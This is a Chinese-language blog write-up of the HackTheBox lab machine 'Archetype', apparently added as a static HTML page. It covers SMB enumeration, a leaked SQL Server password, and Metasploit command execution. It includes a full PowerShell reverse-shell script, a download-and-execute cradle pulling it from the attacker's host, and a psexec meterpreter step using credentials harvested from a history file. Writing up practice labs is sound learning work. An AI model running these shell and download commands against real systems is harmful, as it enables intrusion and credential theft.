@@ -1,0 +1,1035 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="每周练手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - StartingPoint-Archetype">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/StartingPoint-Archetype/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="每周练手">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/b39473da3f36b9b5718d6c76eb573a10.png">
+<meta property="article:published_time" content="2021-12-07T05:01:01.000Z">
+<meta property="article:modified_time" content="2022-04-14T10:56:50.220Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/b39473da3f36b9b5718d6c76eb573a10.png">
+  
+  
+  
+  <title>HackTheBox - StartingPoint-Archetype - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox - StartingPoint-Archetype"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-12-07 13:01" pubdate>
+          2021年12月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HackTheBox"
+        id="heading-d9fb08be3ed131369df5d4aa808dac70" role="tab" data-toggle="collapse" href="#collapse-d9fb08be3ed131369df5d4aa808dac70"
+        aria-expanded="true"
+      >
+        HackTheBox
+        <span class="list-group-count">(16)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-d9fb08be3ed131369df5d4aa808dac70"
+           role="tabpanel" aria-labelledby="heading-d9fb08be3ed131369df5d4aa808dac70">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - BountyHunter</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Cap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Driver</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Horizontall</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Intelligence/" title="HackTheBox - Intelligence"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Intelligence</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Monitors/" title="HackTheBox - Monitors"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Monitors</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Previse/" title="HackTheBox - Previse"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Previse</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Schooled/" title="HackTheBox - Schooled"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Schooled</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Seal</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Shibboleth</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Sink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Spider</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">HackTheBox - StartingPoint-Archetype</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/05/19/HTB/Unicode/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/dynstr/" title="HackTheBox - dynstr"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - dynstr</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox - StartingPoint-Archetype</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月14日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <p>吐槽下VPN，太不稳定了。。</p>
+<p>但没交钱嘛，俺无话可说</p>
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -v <span class="hljs-number">10.10.10.27</span><br></code></pre></td></tr></table></figure>
+
+<p>-sC：使用默认脚本进行扫描，等同于–script&#x3D;default<br>-sV：探测开启的端口来获取服务、版本信息</p>
+<p>-v：vpn不稳定，开了看扫描是不是挂掉了</p>
+<p>典型的windows配置，没有WEB站点：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102057170.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912102057170"></p>
+<h2 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h2><p>445端口的话可以尝试SMB爆破、匿名访问等，winserver版本那么高就不可能有永恒之蓝啦。</p>
+<p>这里最后试出来是匿名访问，使用如下命令访问共享资源列表：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient -N -L <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.27</span>/<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102317995.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912102317995"></p>
+<p>将<code>-N</code>参数去掉即可访问对应的共享资源，然后使用dir命令即可看到共享的文件。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102501965.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912102501965"></p>
+<p>这里是有一个<code>prod.dtsConfig</code>，使用<code>get</code>命令可以下载下来：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102652986.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912102652986"></p>
+<p>可以拿到泄露的账户密码。Google一下能够发现是SQLSERVER的配置信息：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102843077.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912102843077"></p>
+<p>于是我们可以使用metasploit的mssql_exec模块执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> rhosts 10.10.10.27<br>rhosts =&gt; 10.10.10.27<br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> username sql_svc<br>username =&gt; sql_svc<br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> password M3g4c0rp123<br>password =&gt; M3g4c0rp123<br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> domain ARCHETYPE<br>domain =&gt; ARCHETYPE<br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> use_windows_authent <span class="hljs-literal">true</span><br>use_windows_authent =&gt; <span class="hljs-literal">true</span><br>msf6 auxiliary(admin/mssql/mssql_exec) &gt; <span class="hljs-built_in">set</span> cmd <span class="hljs-built_in">whoami</span><br>cmd =&gt; <span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912103145978.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912103145978"></p>
+<p>结果是肥肠不戳的，我们可以进一步把shell拿回来。</p>
+<p>这里直接使用msf的<code>web_delivery</code>模块是会被杀软拦截的，因为没有免杀（Very Easy等级的Box 上杀软真的不大丈夫嗷）。。</p>
+<p>这里就用了官方WP提供的免杀Script：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.98&quot;</span>,<span class="hljs-number">443</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure>
+
+<p>将其保存成<code>reverse_shell.ps1</code>。</p>
+<p>接下来开启80端口的HTTPSERVER，然后在443上NC监听：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912103639411.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912103639411"></p>
+<p>在msf上重新设置要执行的命令，注意转义。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> cmd PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile  IEX (New-Object Net.WebClient).DownloadString(\\\&quot;http://10.10.14.98/reverse_shell.ps1\\\&quot;);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>拿到shell之后一路<code>dir</code>下去。能够在用户的桌面找到<code>user.txt</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> c:\\Users\\sql_svc\\Desktop\\user.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912104054373.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912104054373"></p>
+<h2 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h2><p>root的提权是利用了命令执行历史记录的泄露。一番查找后找到目录<code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
+<p>能够找到泄露的管理员凭据信息：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912104621969.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912104621969"></p>
+<p>直接使用msf的<code>psexec</code>模块即可拿到靶机的meterpreter：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nginx">   <span class="hljs-attribute">Name</span>                  Current Setting   Required  <br>   ----                  ---------------   --------  <br>   RHOSTS                <span class="hljs-number">10.10.10.27</span>       <span class="hljs-literal">yes</span>       <br>   RPORT                 <span class="hljs-number">445</span>               <span class="hljs-literal">yes</span>      <br>   SERVICE_DESCRIPTION                     <span class="hljs-literal">no</span>        <br>   SERVICE_DISPLAY_NAME                    <span class="hljs-literal">no</span>        <br>   SERVICE_NAME                            <span class="hljs-literal">no</span>        <br>   SMBDomain             .                 <span class="hljs-literal">no</span>        <br>   SMBPass               MEGACORP_4dm1n!!  <span class="hljs-literal">no</span>        <br>   SMBSHARE                                <span class="hljs-literal">no</span>        <br>   SMBUser               administrator     <span class="hljs-literal">no</span>        <br><br><br>Payload options (windows/x64/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  <br>   ----      ---------------  -------- <br>   EXITFUNC  thread           <span class="hljs-literal">yes</span>   <br>   LHOST     <span class="hljs-number">10.10.14.98</span>      <span class="hljs-literal">yes</span>      <br>   LPORT     <span class="hljs-number">4444</span>             <span class="hljs-literal">yes</span>     <br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912105037407.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912105037407"></p>
+<p>在管理员的桌面目录下即可拿到root的flag：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912105314444.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210912105314444"></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E9%9D%B6%E5%9C%BA/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox - StartingPoint-Archetype</div>
+      <div>https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/StartingPoint-Archetype/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年12月7日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox - Spider</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder">
+                        <span class="hidden-mobile">HackTheBox - StartingPoint-Pathfinder</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
